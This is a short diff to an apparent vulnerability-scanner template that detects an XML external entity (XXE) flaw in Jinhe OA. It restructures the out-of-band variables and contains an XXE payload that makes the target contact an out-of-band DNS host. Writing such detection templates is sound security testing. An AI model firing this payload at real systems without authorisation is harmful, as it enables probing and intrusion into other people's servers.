@@ -13,11 +13,6 @@ info:
   tags: jinhe,oa,xxe
   created: 2025/8/19
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
-  oobDNS: oob.DNS
-  hostname: request.url.host
 rules:
   r0:
     request:
@@ -26,7 +21,7 @@ rules:
       headers:
         Content-Type: application/xml
       body: |
-        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{oobDNS}}"> %remote;]>
-    expression: response.status == 200 && oobCheck(oob, oob.ProtocolDNS, 3)
+        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{oob.DNS}}"> %remote;]>
+    expression: response.status == 200 && oobCheck(oob.ProtocolDNS, 5)
 
 expression: r0()
